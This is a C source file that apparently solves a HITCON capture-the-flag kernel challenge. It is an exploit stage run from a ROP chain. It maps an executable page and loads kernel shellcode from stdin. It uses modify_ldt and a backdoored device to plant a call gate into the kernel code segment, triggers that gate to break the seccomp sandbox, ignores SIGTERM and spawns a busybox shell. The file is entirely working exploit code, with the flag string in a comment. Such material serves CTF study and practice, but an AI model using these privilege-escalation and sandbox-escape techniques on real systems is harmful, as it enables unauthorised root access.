#include <asm/ldt.h>
#include <fcntl.h>
#include <signal.h>
#include <stddef.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

#define PAGE_SIZE 0x1000
#define sizeof_kernel_sigset_t 8

static long xsyscall(int number, long arg1, long arg2, long arg3, long arg4,
                     long arg5, long arg6) {
  register long rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall"
               : "+r"(rax)
               : "r"(rdi), "r"(rsi), "r"(rdx), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

static int xdup2(int oldfd, int newfd) {
  return xsyscall(__NR_dup2, oldfd, newfd, 0, 0, 0, 0);
}

static int xexecve(const char *pathname, char *const *argv, char *const *envp) {
  return xsyscall(__NR_execve, (long)pathname, (long)argv, (long)envp, 0, 0, 0);
}

static int xmodify_ldt(int func, void *ptr, unsigned long bytecount) {
  return xsyscall(__NR_modify_ldt, func, (long)ptr, bytecount, 0, 0, 0);
}

static void *xmmap(void *addr, size_t length, int prot, int flags, int fd,
                   off_t offset) {
  return (void *)xsyscall(__NR_mmap, (long)addr, length, prot, flags, fd,
                          offset);
}

static int xopen(const char *pathname, int flags, mode_t mode) {
  return xsyscall(__NR_open, (long)pathname, flags, mode, 0, 0, 0);
}

static ssize_t xread(int fd, void *buf, size_t count) {
  return xsyscall(__NR_read, fd, (long)buf, count, 0, 0, 0);
}

static int xsigprocmask(int how, const sigset_t *set, sigset_t *oldset,
                        size_t sigsetsize) {
  return xsyscall(__NR_rt_sigprocmask, how, (long)set, (long)oldset, sigsetsize,
                  0, 0);
}

static ssize_t xwrite(int fd, const void *buf, size_t count) {
  return xsyscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

#define LDT_ENTRY_OFFSET 96
#define LDT_ENTRY_SIZE 8
#define LDT_ENTRY_INDEX (LDT_ENTRY_OFFSET / LDT_ENTRY_SIZE)
#define GDT_ENTRY_KERNEL_CS 2
#define __KERNEL_CS (GDT_ENTRY_KERNEL_CS * 8)
#define LDT_ENTRIES 8192

static void readn(int fd, void *buf, size_t count) {
  while (count != 0) {
    ssize_t n = xread(fd, buf, count);
    if (n < 0) {
      __builtin_trap();
    }
    buf += n;
    count -= n;
  }
}

static void xsigfillset(sigset_t *set) {
  __builtin_memset(set, 0xff, sizeof(*set));
}

__attribute__((section(".entry"))) void _start(void) {
  /* STDIN_FILENO is set by the rop chain */

  /* Read kernel shellcode. */
  void *gate = (void *)0xc00000;
  if (xmmap(gate, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0) != gate) {
    __builtin_trap();
  }
  xwrite(STDIN_FILENO, "mmap ok\n", 8);
  readn(STDIN_FILENO, gate, STAGE2_SIZE);
  xwrite(STDIN_FILENO, "read ok\n", 8);

  /*
   * Two modify_ldt() calls fill both LDT slots (see write_ldt()).
   * The backdoor uses the second slot.
   */

  /* Write selector into the backdoored entry. */
  struct user_desc desc1 = {
      .entry_number = LDT_ENTRY_INDEX,
      .base_addr =
          __KERNEL_CS, /* low 16 bits overlap call gate segment selector */
      .limit = 0xffff,
      .seg_32bit = 0,
      .contents = 0,
      .read_exec_only = 0,
      .limit_in_pages = 0,
      .seg_not_present = 0,
      .useable = 0,
  };
  if (xmodify_ldt(0x11, &desc1, sizeof(desc1)) < 0) {
    __builtin_trap();
  }
  xwrite(STDIN_FILENO, "modify_ldt 1 ok\n", 16);

  /*
   * Grow the LDT so that we have an zero-filled [LDT_ENTRY_INDEX + 1].
   * This is required for 64-bit call gates.
   */
  struct user_desc desc2 = {
      .entry_number = LDT_ENTRIES - 1,
      .base_addr = 0,
      .limit = 0xffff,
      .seg_32bit = 0,
      .contents = 0,
      .read_exec_only = 0,
      .limit_in_pages = 0,
      .seg_not_present = 0,
      .useable = 0,
  };
  if (xmodify_ldt(0x11, &desc2, sizeof(desc2)) < 0) {
    __builtin_trap();
  }
  xwrite(STDIN_FILENO, "modify_ldt 2 ok\n", 16);

  /* Create a call gate in the 2nd LDT slot. */
  int fd = xopen("/dev/i_am_definitely_not_backdoor", O_RDWR, 0);
  if (fd < 0) {
    __builtin_trap();
  }
  xwrite(STDIN_FILENO, "open backdoor ok\n", 17);
  xwrite(fd, "", 1);

  /* Trigger the kernel shellcode. */
  struct {
    unsigned long address;
    unsigned short rpl : 2;
    unsigned short ti : 1;
    unsigned short index : 13;
  } target = {
      .address = 0, .rpl = 3, .ti = 1 /* LDT */, .index = LDT_ENTRY_INDEX};
  /* Encode REX.W manually. */
  asm volatile(".byte 0x48; lcall *(%0)" : : "r"(&target) : "memory");
  xwrite(STDIN_FILENO, "stage2 done\n", 12);

  /* stage2 broke seccomp. */

  /* socat is going mato kill us with SIGTERM. Ignore it. */
  sigset_t mask;
  xsigfillset(&mask);
  xsigprocmask(SIG_SETMASK, &mask, NULL, sizeof_kernel_sigset_t);

  /* Repair stdout and stderr for exec(). */
  if (xdup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO) {
    __builtin_trap();
  }
  xwrite(STDOUT_FILENO, "dup stdout ok\n", 14);
  if (xdup2(STDIN_FILENO, STDERR_FILENO) != STDERR_FILENO) {
    __builtin_trap();
  }
  xwrite(STDERR_FILENO, "dup stderr ok\n", 14);

  /* /root/.flag_is_not_here/.flag_is_definitely_not_here/.genflag */
  /* hitcon{if_kernel_goes_brrrr_seccomp_filter_becomes_this:https://www.youtube.com/watch?v=nTT2fNyKgUE} */
  char busybox[] = "/bin/busybox";
  char tool[] = "sh";
  /* char arg[] = "/"; */
  char *argv[] = {busybox, tool, /* arg, */ NULL};
  char *envp[] = {NULL};
  xexecve(busybox, argv, envp);
  xwrite(STDIN_FILENO, "execve failed\n", 14);
  __builtin_trap();
}
